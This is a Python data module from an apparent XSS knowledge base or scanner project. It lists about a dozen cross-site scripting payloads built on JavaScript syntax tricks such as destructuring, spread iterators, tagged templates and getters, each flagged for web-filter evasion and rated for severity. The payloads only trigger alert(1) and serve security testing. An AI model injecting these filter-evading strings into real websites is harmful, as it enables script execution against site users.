#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

JavaScript Syntax Payloads
"""

from ..models import PayloadEntry


DESTRUCTURING_PAYLOADS = {
    "destruct_1": PayloadEntry(
        payload="<script>var{a=alert(1)}={}</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Object destructuring default",
        tags=["destructuring", "object", "default"],
        waf_evasion=True,
        reliability="high",
    ),
    "destruct_2": PayloadEntry(
        payload="<script>var[a=alert(1)]=[]</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array destructuring default",
        tags=["destructuring", "array", "default"],
        waf_evasion=True,
        reliability="high",
    ),
    "destruct_3": PayloadEntry(
        payload="<script>function f({a=alert(1)}={}){};f()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Parameter destructuring default",
        tags=["destructuring", "parameter", "function"],
        waf_evasion=True,
        reliability="high",
    ),
}

SPREAD_PAYLOADS = {
    "spread_1": PayloadEntry(
        payload="<script>[...''+{[Symbol.iterator]:function*(){yield alert(1)}}]</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Spread with custom iterator",
        tags=["spread", "iterator", "generator"],
        waf_evasion=True,
        reliability="high",
    ),
    "spread_2": PayloadEntry(
        payload="<script>Math.max(...{[Symbol.iterator]:function*(){yield alert(1)}})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Math.max with spread iterator",
        tags=["spread", "math", "iterator"],
        waf_evasion=True,
        reliability="high",
    ),
}

TAGGED_TEMPLATE_PAYLOADS = {
    "tagged_1": PayloadEntry(
        payload="<script>alert`1`</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Simple tagged template",
        tags=["template", "tagged"],
        waf_evasion=True,
        reliability="high",
    ),
    "tagged_2": PayloadEntry(
        payload="<script>Function`x]alert(1)//`</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Function tagged template",
        tags=["template", "tagged", "function"],
        waf_evasion=True,
        reliability="medium",
    ),
    "tagged_3": PayloadEntry(
        payload="<script>eval`alert\\x281\\x29`</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="eval tagged with hex",
        tags=["template", "tagged", "eval", "hex"],
        waf_evasion=True,
        reliability="high",
    ),
    "tagged_4": PayloadEntry(
        payload="<script>setTimeout`alert\\u00281\\u0029`</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="setTimeout tagged with unicode",
        tags=["template", "tagged", "setTimeout", "unicode"],
        waf_evasion=True,
        reliability="high",
    ),
}

COMPUTED_PROPERTY_PAYLOADS = {
    "computed_1": PayloadEntry(
        payload="<script>({[alert(1)]:1})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Computed property key execution",
        tags=["computed", "property"],
        waf_evasion=True,
        reliability="high",
    ),
    "computed_2": PayloadEntry(
        payload="<script>class X{[alert(1)](){}}</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Computed class method name",
        tags=["computed", "class", "method"],
        waf_evasion=True,
        reliability="high",
    ),
}

SHORTHAND_PAYLOADS = {
    "shorthand_1": PayloadEntry(
        payload="<script>({get x(){return alert(1)}}).x</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Getter shorthand XSS",
        tags=["getter", "shorthand"],
        waf_evasion=True,
        reliability="high",
    ),
    "shorthand_2": PayloadEntry(
        payload="<script>({set x(v){alert(1)}}).x=1</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Setter shorthand XSS",
        tags=["setter", "shorthand"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
JS_SYNTAX_DATABASE = {
    **DESTRUCTURING_PAYLOADS,
    **SPREAD_PAYLOADS,
    **TAGGED_TEMPLATE_PAYLOADS,
    **COMPUTED_PROPERTY_PAYLOADS,
    **SHORTHAND_PAYLOADS,
}
JS_SYNTAX_TOTAL = len(JS_SYNTAX_DATABASE)
